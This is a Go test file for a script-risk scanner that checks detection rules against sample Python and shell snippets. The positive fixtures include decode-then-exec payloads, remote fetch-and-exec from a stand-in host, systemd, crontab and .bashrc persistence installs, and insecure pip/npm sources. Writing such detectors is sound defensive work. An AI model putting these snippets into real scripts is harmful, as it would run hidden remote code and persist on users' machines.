package scriptrisk

import (
	"context"
	"testing"

	"github.com/garagon/aguara/internal/scanner"
)

func analyze(t *testing.T, name, src string) []scanner.Finding {
	t.Helper()
	got, err := New().Analyze(context.Background(), &scanner.Target{RelPath: name, Content: []byte(src)})
	if err != nil {
		t.Fatalf("Analyze: %v", err)
	}
	return got
}

func hasRule(t *testing.T, name, src, id string) bool {
	t.Helper()
	for _, f := range analyze(t, name, src) {
		if f.RuleID == id {
			return true
		}
	}
	return false
}

func TestPythonDecodeExec(t *testing.T) {
	positives := []string{
		`import base64
raw = base64.b64decode(blob)
exec(raw)`,
		`import base64, zlib
def unpack():
    raw = base64.b64decode(BLOB)
    return zlib.decompress(raw)
exec(compile(unpack(), "<runtime>", "exec"), {})`,
		`from codecs import decode
payload = codecs.decode(blob, "hex")
stage = payload.decode()
exec(stage)`,
		`def run(blob):
    if blob:
        payload = base64.b64decode(blob)
        exec(payload)`,
		`payload = "".join(chr(value) for value in [112, 114, 105, 110, 116])
exec(payload)`,
		`exec("".join([chr(112), chr(114), chr(105), chr(110), chr(116)]))`,
	}
	for i, src := range positives {
		if !hasRule(t, "scripts/setup.py", src, RulePythonDecodeExec) {
			t.Errorf("positive %d did not fire", i)
		}
	}
}

func TestPythonDecodeExecFalsePositives(t *testing.T) {
	negatives := []string{
		`import base64
raw = base64.b64decode(blob)
save(raw)`,
		`exec("print('reviewed source')")`,
		`# exec(base64.b64decode(blob))
print("ok")`,
		`"""Example: exec(base64.b64decode(blob))"""
print("ok")`,
		`def decode_config():
    return base64.b64decode(DATA)
exec("print('unrelated')")`,
		`def inspect_config():
    base64.b64decode(DATA)
    return "reviewed"
exec(inspect_config())`,
		`payload = base64.b64decode(blob)
payload = "safe"
exec(payload)`,
		`def decode_only(blob):
    payload = base64.b64decode(blob)
    return payload
def execute_reviewed():
    exec(payload)`,
		`label = "".join(chr(value) for value in [65, 66, 67])
print(label)`,
		`payload = "".join(chr(value) for value in codes)
payload = "print('reviewed')"
exec(payload)`,
	}
	for i, src := range negatives {
		if hasRule(t, "scripts/setup.py", src, RulePythonDecodeExec) {
			t.Errorf("negative %d fired", i)
		}
	}
}

func TestPythonRemoteFetchExec(t *testing.T) {
	positives := []string{
		`import requests
code = requests.get("https://payload.example/stage.py").text
exec(code)`,
		`import httpx as client
response = client.get(url)
payload = response.content.decode()
exec(compile(payload, "<remote>", "exec"))`,
		`from urllib.request import urlopen as fetch
raw = fetch("https://payload.example/stage.py")
exec(raw.read())`,
		`from urllib import request as req
def run(url):
    response = req.urlopen(url)
    code = response.read().decode()
    exec(code)`,
		`import urllib.request
def load(url):
    return urllib.request.urlopen(url, timeout=5).read().decode()
def main():
    code = load("https://payload.example/stage.py")
    if code:
        exec(compile(code, "<remote>", "exec"), {})`,
	}
	for i, src := range positives {
		if !hasRule(t, "scripts/bootstrap.py", src, RulePythonRemoteExec) {
			t.Errorf("positive %d did not fire", i)
		}
	}
}

func TestPythonRemoteFetchExecFalsePositives(t *testing.T) {
	negatives := []string{
		`import requests
response = requests.get(url)
save(response.content)`,
		`import requests
response = requests.get(url)
response = SafeResponse("print('reviewed')")
exec(response.text)`,
		`import requests
exec("print('reviewed')")
response = requests.get(url)`,
		`# exec(requests.get("https://payload.example/stage.py").text)
print("ok")`,
		`"""Example: exec(requests.get("https://payload.example/stage.py").text)"""
print("ok")`,
		`class Client:
    def get(self, url):
        return SafeResponse()
client = Client()
exec(client.get(url).text)`,
		`import requests
def download(url):
    return requests.get(url).text
def execute():
    exec(payload)`,
	}
	for i, src := range negatives {
		if hasRule(t, "scripts/bootstrap.py", src, RulePythonRemoteExec) {
			t.Errorf("negative %d fired", i)
		}
	}
}

func TestStructuredPythonPersistence(t *testing.T) {
	src := `import subprocess
from pathlib import Path
unit_dir = Path.home() / ".config" / "systemd" / "user"
(unit_dir / "cache.service").write_text(SERVICE)
subprocess.run([
    "systemctl", "--user", "enable", "--now", "cache.service",
], check=False)
`
	if !hasRule(t, "scripts/setup.py", src, RuleSystemPersistence) {
		t.Fatal("structured systemd install did not fire")
	}
	for _, src := range []string{
		`print("systemctl --user enable cache.service")`,
		`class Runner:
    def run(self, args): pass
runner = Runner()
runner.run(["systemctl", "--user", "enable", "cache.service"])`,
		`subprocess.run(["systemctl", "--user", "status", "cache.service"])`,
		`unit_dir = Path.home() / ".config" / "systemd" / "user"
print(unit_dir / "cache.service")`,
		`# os.system("systemctl --user enable cache.service")`,
	} {
		if hasRule(t, "scripts/setup.py", src, RuleSystemPersistence) {
			t.Fatalf("benign persistence lookalike fired: %s", src)
		}
	}
}

func TestLegacyPersistenceShapesRemainCovered(t *testing.T) {
	positives := []string{
		`import os
os.system("systemctl --user enable cache.service")`,
		`from os import system
system("systemctl --user enable cache.service")`,
		`from os import popen as run_command
run_command("echo '@reboot python ~/.cache/a.py' | crontab -")`,
		`import os
os.system("echo '@reboot python ~/.cache/a.py' | crontab -")`,
		`import os
open(os.path.expanduser("~/.bashrc"), "a").write("python3 ~/.cache/a.py &")`,
	}
	for _, src := range positives {
		if !hasRule(t, "install.py", src, RuleSystemPersistence) {
			t.Fatalf("legacy persistence shape did not fire: %s", src)
		}
	}
	if hasRule(t, "install.py", `def system(command):
    return command
system("systemctl --user enable cache.service")`, RuleSystemPersistence) {
		t.Fatal("unbound local system helper fired")
	}
}

func TestUnsafePipSource(t *testing.T) {
	positives := []string{
		`pip install git+http://code.example/team/tool.git`,
		`python3 -m pip install --index-url http://203.0.113.4/simple package`,
		`pip install http://92.151.20.3/releases/helper-1.0.0-py3-none-any.whl`,
		`prepare && pip install \
  --extra-index-url=http://packages.example/simple helper`,
	}
	for _, src := range positives {
		if !hasRule(t, "scripts/bootstrap.sh", src, RuleUnsafePipSource) {
			t.Fatalf("unsafe source did not fire: %s", src)
		}
	}
}

func TestUnsafePipSourceFalsePositives(t *testing.T) {
	negatives := []string{
		`pip install requests`,
		`pip install git+https://github.com/acme/tool.git`,
		`pip install --index-url https://packages.example/simple package`,
		`pip install --index-url http://127.0.0.1:8080/simple package`,
		`pip install --index-url http://localhost:8080/simple package`,
		`pip install --index-url http://[::1]:8080/simple package`,
		`pip install http://localhost:8080/helper.whl`,
		`pip install helper --config-settings callback=http://packages.example/report`,
		`# pip install git+http://evil.example/tool.git`,
		`echo "pip install git+http://docs.example/tool.git"`,
		`run "pip install --index-url http://packages.example/simple x"`,
	}
	for _, src := range negatives {
		if hasRule(t, "scripts/bootstrap.sh", src, RuleUnsafePipSource) {
			t.Fatalf("benign source lookalike fired: %s", src)
		}
	}
}

func TestUnsafeNPMSource(t *testing.T) {
	positives := []string{
		`npm install http://102.30.40.5/releases/helper.tgz`,
		`npm i git+http://code.example/team/helper.git`,
		`prepare && env NODE_ENV=production npm install http://packages.example/helper.tgz`,
	}
	for _, src := range positives {
		if !hasRule(t, "scripts/bootstrap.sh", src, RuleUnsafeNPMSource) {
			t.Fatalf("unsafe npm source did not fire: %s", src)
		}
	}

	negatives := []string{
		`npm install express`,
		`npm install http-server`,
		`npm install https://packages.example/helper.tgz`,
		`npm install git+https://github.com/acme/helper.git`,
		`npm install http://127.0.0.1:8080/helper.tgz`,
		`npm install helper --userconfig=http://packages.example/config`,
		`# npm install http://packages.example/helper.tgz`,
		`echo "npm install http://packages.example/helper.tgz"`,
		`run "npm install http://packages.example/helper.tgz"`,
	}
	for _, src := range negatives {
		if hasRule(t, "scripts/bootstrap.sh", src, RuleUnsafeNPMSource) {
			t.Fatalf("benign npm source lookalike fired: %s", src)
		}
	}
}

func TestShellPersistenceCoverage(t *testing.T) {
	positives := []string{
		`systemctl --user enable cache.service`,
		`echo '@reboot python ~/.cache/a.py' | crontab -`,
		`cat unit.service > ~/.config/systemd/user/cache.service`,
		`printf 'python3 ~/.cache/a.py &' >> ~/.bashrc`,
		`printf 'python3 ~/.cache/a.py &' | tee -a ~/.zshrc`,
	}
	for _, src := range positives {
		if !hasRule(t, "scripts/install.sh", src, RuleSystemPersistence) {
			t.Fatalf("shell persistence did not fire: %s", src)
		}
	}
	negatives := []string{
		`systemctl --user status cache.service`,
		`echo "systemctl --user enable cache.service"`,
		`# systemctl --user enable cache.service`,
		`printf 'export PATH=$PATH:/opt/tool' >> ~/.bashrc`,
		`cat unit.service > ./cache.service`,
		`echo "cat unit.service > ~/.config/systemd/user/cache.service"`,
		`echo "printf python >> ~/.bashrc"`,
		`echo '~/.bashrc' > /tmp/path.txt`,
	}
	for _, src := range negatives {
		if hasRule(t, "scripts/install.sh", src, RuleSystemPersistence) {
			t.Fatalf("shell persistence lookalike fired: %s", src)
		}
	}
}

func TestOtherFilesAreIgnored(t *testing.T) {
	if got := analyze(t, "README.md", `exec(base64.b64decode(blob))`); len(got) != 0 {
		t.Fatalf("README emitted findings: %+v", got)
	}
}
